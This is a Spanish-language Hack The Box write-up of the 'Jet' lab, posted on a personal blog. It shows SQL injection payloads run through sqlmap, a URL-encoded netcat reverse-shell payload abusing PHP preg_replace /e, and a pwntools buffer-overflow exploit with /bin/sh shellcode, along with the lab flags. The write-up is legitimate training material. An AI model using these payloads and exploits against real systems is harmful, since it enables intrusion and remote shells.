<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<title>Jet - Writeup S0b3k</title>
<link rel="shortcut icon" type="image/png" sizes="64x64" href="../images/HTB/Jet/Jetcom_logo.png">
<!--

Machine LogForge

-->
<link rel="stylesheet" href="../css/bootstrap.min.css">
<link rel="stylesheet" href="../css/font-awesome.min.css">

<!-- Main css -->
<link rel="stylesheet" href="../css/style.css">
<link href="https://fonts.googleapis.com/css?family=Lora|Merriweather:300,400" rel="stylesheet">

</head>
<body>

<!-- PRE LOADER -->

<div class="preloader">
     <div class="sk-spinner sk-spinner-wordpress">
          <span class="sk-inner-circle"></span>
     </div>
</div>

<!-- Navigation section  -->

<div class="navbar navbar-default navbar-static-top" role="navigation">
     <div class="container">

          <div class="navbar-header">
               <button class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="icon icon-bar"></span>
                    <span class="icon icon-bar"></span>
                    <span class="icon icon-bar"></span>
               </button>
               <a href="../index.html" class="navbar-brand">S0b3k</a>
          </div>
          <div class="collapse navbar-collapse">
               <ul class="nav navbar-nav navbar-right">
                    <li class="active"><a href="../index.html">Home</a></li>
                    <li><a href="../categories.html">Categories</a></li>
                    <li><a href="../about.html">About Me</a></li>
               </ul>
          </div>

  </div>
</div>

<!-- Home Section -->

<section id="home" class="main-post-jet parallax-section" style="height: 360px;">
     <div class="overlay"></div>
     <div id="particles-js"></div>
     <div class="container">
          <div class="row">

               <div class="col-md-12 col-sm-12">
                    <h1>JET.com</h1>
               </div>

          </div>
     </div>
</section>

<!-- Blog Single Post Section -->

<section id="blog-single-post">
     <div class="container">
          <div class="row">
               <div class="col-md-offset-1 col-md-10 col-sm-12">
                    <div class="blog-single-post-thumb">
                         <div class="blog-post-title">
                              <h3><a href="#">Jet | Hack The Box</a></h3>
                         </div>
                         <div class="blog-post-format">
                              <span><a href="#"><img src="../images/HTB/Jet/Jetcom_logo.png" class="img-responsive "> OS Linux</a></span>
                              <span><i class="fa fa-date"></i>April, 2018</span>
                              <span><a href="#"><i class="fa-solid fa-fire"></i> Fortress</a></span>
                         </div>
                         <div class="blog-post-des">
                              <p>Jet.com es una empresa que esta desarrollando una nueva metodologia para el comercio electronico, ha colaborado con Hack The Box ofreciendonos una cantidad interesante de vulnerabilidades que ayudaran mucho a tener una vision mas empresarial de las pruebas de penetracion incorporando algunas flags que nos iran indicando cuando hemos pwneado cierta vulnerabilidad expuesta.</p>
                         </div>

                         <!--First Flag-->
                         <h3 style="color: #dacece;">Flag 1: Connect</h3>
                         <p>La primera flag se consigue bajo la instruccion de conectar, primero verificamos si tenemos conexión e indirectamente conocemos el sistema operativo <a class="code">[ttl=64 - Linux]</a> bajo el cual se encuentra el servidor.</p>
                         <pre class="pre-code"><a class="command">❯ ping</a> 10.13.37.10
10.13.37.10 (10.13.37.10) 56(84) bytes of data.
64 bytes from 10.13.37.10: icmp_seq=1 ttl=63 time=81.1 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=63 time=81.9 ms
64 bytes from 10.13.37.10: icmp_seq=3 ttl=63 time=81.1 ms
64 bytes from 10.13.37.10: icmp_seq=4 ttl=63 time=80.8 ms
--- 10.13.37.10 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 80.776/81.225/81.910/0.418 ms</pre>
                         <p>Seguido a ello revisamos los servicios disponibles con <a class="code">nmap</a></p>
                         <pre class="pre-code"><a class="command">❯ nmap</a> -p- --open -sS -T5 -n -Pn -oN JetPorts.nmap 10.13.37.10
Nmap scan report for 10.13.37.10
Host is up (0.089s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5555/tcp open  freeciv
7777/tcp open  cbt
9201/tcp open  wap-wsp-wtp</pre>
                         <p>Como servicio mas llamativo accederemos primero al puerto 80 http a traves del navegador, ecnontrandonos con la primera flag: <a class="code">JET{s4n1ty_ch3ck}</a></p>
                         <span>
                              <img src="../images/HTB/Jet/http80.png"/>
                         </span>
                         <!--End First flag-->

                         <!--Second Flag-->
                         <h3 style="color: #dacece;">Flag 2: Digging in...</h3>
                         <p>Para la segunda flag el nombre es una pista, basandonos en el escaneo de <a class="code">Nmap</a> anterior, encontramos el servicio de dominio abierto en el puerto 53, usaremos la herramienta <a class="code">dig</a> para descubrir otros dominios asociados al servidor encontrando <a class="code">www.securewebinc.jet</a></p>
                         <pre class="pre-code"><a class="command">❯ dig</a> @10.13.37.10 -x 10.13.37.10
; <<>> DiG 9.16.33-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.    604800    IN    SOA    www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800</pre>

                         <p>Agregamos el dominio a <a class="code">/etc/hosts</a> y accedemos a la web encontrado la flag <a class="code">JET{w3lc0me_4nd_h@v3_fun!}</a>.</p>
                         <span>
                              <img src="../images/HTB/Jet/second_flag.png"/>
                         </span>
                         <!--End Second flag-->

                         <!--Third Flag-->
                         <h3 style="color: #dacece;">Flag 3: Going Deeper</h3>
                         <p>En la tercera flag tenemos el mismo caso, el nombre nos indica buscar mas profundo asi que revisaremos el codigo fuente de la pagina que acabamos de descubrir.</p>
                         <p>Entre el codigo fuente, siempre resaltan los scripts JS personalizados (custom), dentro de estos, el mas llamativo es <a class="code">secure.js</a></p>
                         <pre class="pre-code">
<a class="a-green">&lt;!-- Custom scripts for this template--&gt;</a>
&lt;<a class="a-red">script</a> src="<u class="a-blue">js/template.js</u>"&gt;&lt;&#47;<a class="a-red">script</a>&gt;
&lt;<a class="a-red">script</a> src="<u class="a-blue">js/secure.js</u>"&gt;&lt;&#47;<a class="a-red">script</a>&gt;</pre>     
                         <p><br>En este script encontramos un eval de JS</p>
                         <pre class="pre-code"> eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));</pre>
                         <p><br>Para obtener el codigo usare la herramienta <a class="toolref" href="https://lelinhtinh.github.io/de4js/">de4js</a> encontrando el path de url <a class="code">/dirb_safe_dir_rf9EmcEIx/admin/stats.php</a></p>
                         <span>
                              <img src="../images/HTB/Jet/deofuscate_eval.png"/>
                         </span>
                         <p><br>Accediendo a la URL no encontramos nada interesante.</p>
                         <span>
                              <img src="../images/HTB/Jet/stats.png"/>
                         </span>
                         <p><br>Sin embargo, si quitamos el archivo final <a class="code">stats.php</a> la pagina hace un redirect a <a class="code">index.php</a></p>
                         <span>
                              <img src="../images/HTB/Jet/index.png"/>
                         </span>
                         <p><br>Y en su codigo fuente la flag <a class="code">JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}</a></p>
                         <span>
                              <img src="../images/HTB/Jet/flag-3.png"/>
                         </span>
                         <!--End Third flag-->

                         <!--Fourth Flag-->
                         <h3 style="color: #dacece;">Flag 4: Bypassing Authentication</h3>
                         <p>La instrucción de la cuarta flag nos indica que deberemos bypassear la autenticación para obtener la flag, comencé interceptando la petición del login con <a class="code">Burpsuite</a>, y ya que la petición se encontraba en texto plano realicé prubeas de SQLi sin resultados positivos.</p>
                         <span>
                              <img src="../images/HTB/Jet/dologin.png"/>
                         </span>
                         <p><br>Continuando con el SQLi ejecute la herramienta automatizada <a class="code">sqlmap</a> con la solicitud almacenada la cual si dió resultados, logrando enumerar las bases de datos alojadas.</p>
                         <span>
                              <pre class="pre-code"><a class="command">❯ cat</a> dologin
────┬───────────────────────────────────────────────────────────────────────────────────────────────
    │ File: dologin
────┼───────────────────────────────────────────────────────────────────────────────────────────────
  1 │ POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
  2 │ Host: www.securewebinc.jet
  3 │ User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
  4 │ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  5 │ Accept-Language: en-US,en;q=0.5
  6 │ Accept-Encoding: gzip, deflate
  7 │ Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
  8 │ Content-Type: application/x-www-form-urlencoded
  9 │ Content-Length: 29
 10 │ Origin: http://www.securewebinc.jet
 11 │ DNT: 1
 12 │ Connection: close
 13 │ Cookie: PHPSESSID=h40pauadc0vsru3ujdmq61mri3
 14 │ Upgrade-Insecure-Requests: 1
 15 │ 
 16 │ username=admin&password=admin
────┴────────────────────────────────────────────────────────────────────────────────────────────────</pre>
                         </span>
                         <br><br>
                         
                         <pre class="pre-code"><a class="command">❯ sqlmap</a> -r dologin -dbs
[INFO] parsing HTTP request from 'dologin'
---
Parameter: username (POST)
     Type: error-based
     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
     Payload: username=admin' AND (SELECT 6669 FROM(SELECT COUNT(*),CONCAT(0x7178707871,(SELECT (ELT(6669=6669,1))),0x717a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS 
              GROUP BY x)a)-- ZeSF&password=admin
     
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: username=admin' AND (SELECT 6821 FROM (SELECT(SLEEP(5)))onXD)-- Gqji&password=admin
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] jetadmin</pre>
                         <p><br>Procedi a dumpear la base de datos <a class="code">jetadmin</a> obteniendo un hash del usuario admin.</p>
                         <pre class="pre-code"><a class="command">❯ sqlmap</a> -r dologin -D jetadmin --dump
[WARNING] no clear password(s) found
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+</pre>

                         <p>Con el hash encontrado use la herramienta <a class="toolref" href="https://crackstation.net/">Crackstation</a> para romper este mismo, obteniendo la contraseña del usuario admin.
                         <span>
                              <img src="../images/HTB/Jet/crackstation.png"/>
                         </span>
                         <p><br>Iniciando sesion con las credenciales obtenidas obtuve la flag <a class="code">JET{sQl_1nj3ct1ons_4r3_fun!}</a>.</p>
                         <span>
                              <img src="../images/HTB/Jet/flag-4.png"/>
                         </span>
                         <!--End Fourth flag-->

                         <!--Start Fifth flag-->
                         <h3 style="color: #dacece;">Flag 5: Command</h3>
                         <p> Para la quinta flag la instruccion es <a class="code">command</a> y se basa en una vulnerabilidad de <a class="code">[RCE] Remote Command Execution.</a><br> Partiendo con esta idea, revise que existe un apartado de Quick Email, procedi a comprobar el funcionamiento y lógica de la trama interceptada  
                         </p>
                         <span>
                              <img src="../images/HTB/Jet/quick_email.png"/>
                         </span>
                         <p><br></p>
                         <span>
                              <img src="../images/HTB/Jet/mail_intercept.png"/>
                         </span>
                         <br>
                         <p>
                              URL decodeando el contenido de la trama vemos lo siguiente. 
                         <pre class="pre-code">
<a class="a-blue">swearwords</a>[<a class="a-red">/fuck/i</a>]=<a class="a-green">make love</a>&
<a class="a-blue">swearwords</a>[<a class="a-red">/shit/i</a>]=<a class="a-green">poop</a>&
<a class="a-blue">swearwords</a>[<a class="a-red">/ass/i</a>]=<a class="a-green">behind</a>&
<a class="a-blue">swearwords</a>[<a class="a-red">/dick/i</a>]=<a class="a-green">penis</a>&
<a class="a-blue">swearwords</a>[<a class="a-red">/whore/i</a>]=<a class="a-green">escort</a>&
<a class="a-blue">swearwords</a>[<a class="a-red">/asshole/i</a>]=<a class="a-green">bad person</a>&
<a class="a-blue">to</a>=<a class="a-green">s0bek@mailtest.com</a>&
<a class="a-blue">subject</a>=<a class="a-green">Subject_s0b3k</a>&
<a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_message&lt;br>&lt;/p></a>&
<a class="a-blue">_wysihtml5_mode</a>=1</pre>
                         </p>
                         <p>Dada la lógica de <a class="code">Palabrotas</a> parece que realiza una busqueda y reemplazo de palabras, esto bajo las expresiones regulares <a class="code">/i</a> en base a esto probaremos la expresion regular de execución <a class="code">/e</a><br>Para prueba de concepto lanzare una traza icmp a mi maquina en espera de esta trama, reemplazando el payload tanto en el subject y el message.</p>
                         <pre class="pre-code">
<a class="a-blue">swearwords</a>[<a class="a-red">/s0b3k_payload/e</a>]=<a class="a-green">ping -c1 10.10.14.10</a>&
<a class="a-blue">to</a>=<a class="a-green">s0bek@mailtest.com</a>&
<a class="a-blue">subject</a>=<a class="a-green">s0b3k_payload</a>&
<a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_payload&lt;br>&lt;/p></a>&
<a class="a-blue">_wysihtml5_mode</a>=1</pre>
                         <p>
                              <br>La trama encodeada se vera de la siguiente manera:
                         </p>
                         <pre class="pre-code">
swearwords%5B%2Fs0b3k_payload%2Fe%5D=system('ping%2010.10.14.10')&to=s0bek%40mailtest.com&subject=s0b3k_payload&message=%3Cp%3Es0b3k_payload%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1</pre>
                         <br>
                         <p>A pesar de recivir la captura con la escucha de tcpdump, vemos que la peticion igual reemplaza el mensaje en el payload adjunto y se puede ver evidenciado en Burpsuite.
                         </p>
                         <span>
                              <img src="../images/HTB/Jet/POC_RCE.png"/>
                         </span>
                         <p>
                              <br>
                              Aplicaria lo mismo para la shell reversa con el siguiente payload, de manera que ganamos acceso al sistema y podemos observar la flag <a class="code">JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}</a>
                         </p>
                         <pre class="pre-code">
swearwords%5B%2Fs0b3k_payload%2Fe%5D=system('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.10%204444%20%3E%2Ftmp%2Ff')&to=s0bek%40mailtest.com&subject=s0b3k_payload&message=%3Cp%3Es0b3k_payload%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1</pre>
                         <pre class="pre-code">
<a class="command">❯ nc</a> -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.13.37.10 48924
sh: can't access tty; job control turned off
$ whoami
www-data
$ ls  
a_flag_is_here.txt
...

$ cat "a_flag_is_here.txt"
JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
$ </pre>                              

                         <!--End Fifth flag-->
                         
                         <!--Start Sixth flag-->
                         <h3 style="color: #dacece;">Flag 6: Overflow</h3>
                         <p> En la sexta flag llamada <a class="code">overflow</a> practicamente nos adelanta que ejecutaremos un <a class="code">[BOF] Buffer OverFlow.</a><br>Asi, despues del tratamiento de la tty comencé buscando un archivo binario que permita al usuario actual ejecutarse como sudo.</p>
                         
                         <pre class="pre-code">
www-data@jet:~$ find / -perm -u+s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/lib/uncompress.so
<a style="background-color: coral; color: #f0f0f0;">/home/leak</a>
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/ping6</pre>
                         <p>El mas llamativo, por su ubicacion es el archivo leak, así, verificando su contenido lo lleve a mi máquina.</p>
                         
                         <pre class="pre-code">
www-data@jet:/home$ file leak
leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
www-data@jet:/home$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 ...</pre>
                         <pre class="pre-code">
<a class="command">❯ wget</a> http://10.13.37.10:8888/leak
Conectando con 10.13.37.10:8888... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 9112 (8,9K) [application/octet-stream]
Grabando a: «leak»

leak          100%[====================================================================================>]   8,90K  --.-KB/s    en 0s      

(271 MB/s) - «leak» guardado
                         </pre>
                         <p>Revisandolo su ejecucion normal, nos da lo siguiente</p>
                         <pre class="pre-code">
<a class="command">❯ ./leak</a>
Oops, I'm leaking! 0x7ffe3080fb60
Pwn me ¯\_(ツ)_/¯ 
> hola</pre>
                         <p>Si al input le anidamos una cadena mas larga se produce un error de segmentacion, desbordando el espacio en memoria al cual se almacene este input.</p>
                         <pre class="pre-code">
<a class="command">❯ ./leak</a>
Oops, I'm leaking! 0x7ffda23327f0
Pwn me ¯\_(ツ)_/¯ 
> 12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912
zsh: segmentation fault  ./leak</pre>
                         <p>Revisemos esto con gdb, adjunte una cadena de 200 veces 5 y valide que sea reemplazado en el RSP, nos indica que el 5 esta presente 128 veces, con esto ya podriamos deducir que el offset es <a class="code">72 [200-128]</a></p>
                         <pre class="pre-code">
<a class="command">❯ gdb</a> -q leak
Reading symbols from leak...
(No debugging symbols found in leak)
(gdb) run
Starting program: /home/s0bek/HTB/Jet/leak 
Oops, I'm leaking! 0x7fffffffe4a0
Pwn me ¯\_(ツ)_/¯ 
> 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
(gdb) x/20s $rsp
0x7fffffffe4e8:    '5' &lt;repeats 128 times>, "\n"
0x7fffffffe56a:    ""
0x7fffffffe56b:    ""
0x7fffffffe56c:    ""</pre>
                         <p>Para ser mas precisos podemos encontrar el punto en el que la memoria se desborda provocando la segmentación creando un patrón de caracteres con la herramienta de metasploit.</p>
                         </p>
                         <pre class="pre-code"><a class="command">❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb</a> -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</pre>
                         
                         <p>Esta cadena la incluiremos en GDB y ahora buscaremos la dirección en la que termina el RSP</p>
<pre class="pre-code">(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/s0bek/HTB/Jet/leak 
Oops, I'm leaking! 0x7fffffffe4a0
Pwn me ¯\_(ツ)_/¯ 
> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
(gdb) x/wx $rsp
0x7fffffffe4e8:    0x41346341
(gdb)</pre>
                         <p>Con metasploit buscaremos la longitud del espacio en offset en el cual desborda</p>
                         <pre class="pre-code">
<a class="command">❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb</a> -q 0x41346341
[*] Exact match at offset 72</pre>
                         <p>Ya que la salida del programa nos indica el leaking o EIP, temporalmente determinaremos el tamaño del Payload de la siguiente manera</p>
                         <pre class="pre-code">
<a class="a-red">Shellcode</a> = int(?)
<a class="a-green">Buffer</a> = \x55 * (72 - len(Shellcode))
<a class="a-blue">RIP</a> = b"0x7fffffffe4a0"</pre>
                         <p>Agregue un shellcode que no sobrepase la longitud destinada al offset, <a href="https://www.exploit-db.com/shellcodes/46907">exploitdb</a> contiene uno que ejecuta un /bin/sh.</p>
                         <pre class="pre-code">
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</pre>
                         <p>Como vemos, el shellcode tendra una longitud de 23 bytes, de manera que nuestro payload quedaria de la siguiente manera.</p>
                         <pre class="pre-code">
<a class="a-red">Shellcode</a> = \x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05
<a class="a-green">Buffer</a> = \x55 * (72 - 23)
<a class="a-blue">RIP</a> = b"0x7fffffffe4a0"</pre>
                         <p>Ahora verificaremos que el shellcode sea incluido dentro de nuestro offset justo antes de nuestro NOPs. Creare el payload completo con python y revisare el RSP del buffer con gdb</p>
                         <pre class="pre-code">
<a class="command">❯ python3 </a>
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
<a class="command">>>></a> from pwn import *
<a class="command">>>></a> shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
<a class="command">>>></a> offset = b"\x55" * (72-23)
<a class="command">>>></a> eip = 0x7fffffffe4a0
<a class="command">>>></a> payload = shellcode + offset + p64(eip)
<a class="command">>>></a> print(payload)
H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xa0\xe4\xff\xff\xff\x7f\x00\x00</pre>
<pre class="pre-code">
(gdb) run
Starting program: /home/s0bek/HTB/Jet/leak 
Oops, I'm leaking! 0x7fffffffe4a0
Pwn me ¯\_(ツ)_/¯ 
> H\xbf/bin//shWT_j;X\x99\x0f\x05UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xa0\xe4\xff\xff\xff\x7f\x00\x00
Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()

(gdb) x/200xb $rsp-72
<a class="a-blue">0x7fffffffe4a0:</a>    <a class="a-red">0x48    0x31    0x5c    0x78    0x66    0x36    0x56    0x48</a>
<a class="a-blue">0x7fffffffe4a8:</a>    <a class="a-red">0x5c    0x78    0x62    0x66    0x2f    0x62    0x69    0x6e</a>
<a class="a-blue">0x7fffffffe4b0:</a>    <a class="a-red">0x2f    0x2f    0x73    0x68    0x57    0x54    0x5f    0x6a</a>
<a class="a-blue">0x7fffffffe4b8:</a>    <a class="a-red">0x3b    0x58    0x5c    0x78    0x39    0x39    0x5c    0x78</a>
<a class="a-blue">0x7fffffffe4c0:</a>    <a class="a-red">0x30    0x66    0x5c    0x78    0x30    0x35    <a class="a-green">0x55    0x55</a>
<a class="a-blue">0x7fffffffe4c8:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<a class="a-blue">0x7fffffffe4d0:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<a class="a-blue">0x7fffffffe4d8:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<a class="a-blue">0x7fffffffe4e0:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<a class="a-blue">0x7fffffffe4e8:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<a class="a-blue">0x7fffffffe4f0:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x5c</a>
<a class="a-blue">0x7fffffffe4f8:</a>    0x78    0x61    0x30    0x5c    0x78    0x65    0x34    0x5c
<a class="a-blue">0x7fffffffe500:</a>    0x78    0x66    0x66    0x5c    0x78    0x66    0x66    0x5c
<a class="a-blue">0x7fffffffe508:</a>    0x78    0x66    0x66    0x5c    0x78    0x37    0x66    0x5c
<a class="a-blue">0x7fffffffe510:</a>    0x78    0x30    0x30    0x5c    0x78    0x30    0x30    0x0a
<a class="a-blue">0x7fffffffe518:</a>    0x00    0xf9    0xa9    0x47    0xe7    0x96    0x2d    0x0b
<a class="a-blue">0x7fffffffe520:</a>    0xa0    0x06    0x40    0x00    0x00    0x00    0x00    0x00</pre>

                         <p>Aunque notamos algunas variaciones en el payload debido a la interpretacion, el payload quedo funcional. 
                         <br>Existe una complicación en que la dirección del RIP es variable entre cada ejecución fuera de gdb, para solventar esto filtraremos con python la salida del programa hasta llegar al RIP y agregarlo en una variable.
                         <br> Adicional a ello para recibir la ejecución del comando levantaremos del lado del servidor el archivo en ejecución a través de socat y con python accederemos a la ejecución del binario de manera remota.
                         <br><br>El script en python queda de la siguiente manera:
                         </p>
                         <pre class="pre-code">
<a class="command">❯ cat</a> leaking.py
────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    │ File: leaking.py
────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  1 │ #!/usr/bin/python3
  2 │ 
  3 │ from pwn import *
  4 │ 
  5 │ shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
  6 │ offset = b"\x55"*(72-23)
  7 │ 
  8 │ shell = remote('10.13.37.10', 1337)
  9 │ shell.recvuntil(b"Oops, I'm leaking! ")
 10 │ rip = int(shell.recvuntil(b"\n"),16)
 11 │ 
 12 │ payload = shellcode + offset + p64(rip)
 13 │ shell.recvuntil(b"> ")
 14 │ shell.sendline(payload)
 15 │ shell.interactive()
────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────</pre>
                         
                         <p>Exponemos la ejecución del binario</p>
                         <pre class="pre-code">www-data@jet:/home$ socat TCP-LISTEN:1337,fork EXEC:./leak &</pre>
                         <p>Ejecución del script</p>
                         <pre class="pre-code">
<a class="command">❯ ./leaking.py</a>
[+] Opening connection to 10.13.37.10 on port 1337: Done
[*] Switching to interactive mode
<a class="a-red">$</a> whoami
alex</pre>
                         <!--End Sixth flag-->
                         <div class="blog-author">
                              <div class="media">
                                   <div class="media-object pull-left">
                                        <img src="../images/perfil.jpeg" class="img-circle img-responsive" alt="blog">
                                   </div>
                                   <div class="media-body">
                                        <h3 class="media-heading"><a href="#">S0b3k [Author]</a></h3>
                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip.</p>
                                   </div>
                              </div>
                         </div>
                    </div>
          </div>
     </div>
</section>

<!-- Footer Section -->
<footer>
     <div class="container">
          <div class="row">

               <div class="col-md-5 col-md-offset-1 col-sm-6">
                    <h3>MyclFrn - S0b3k</h3>
                    <p>Hacker Etico/ Pentester</p>
                    <div class="footer-copyright">
                         <p>Copyright &copy; 2017 Based Design: Tooplate</p>
                    </div>
               </div>

               <div class="col-md-4 col-md-offset-1 col-sm-6">
                    <h3>Talk to me</h3>
                    <p><i class="fa fa-globe"></i> Quito, Ecuador</p>
                    <p><i class="fa fa-envelope"></i> michael.fernando.sanchez@gmail.com</p>
               </div>

               <div class="clearfix col-md-12 col-sm-12">
                    <hr>
               </div>

               <div class="col-md-12 col-sm-12">
                    <ul class="social-icon">
                         <li><a href="https://github.com/MyclFrn/" class="fa fa-github"></a></li>
                         <li><a href="https://www.linkedin.com/in/m4yc0lfrn" class="fa fa-linkedin"></a></li>
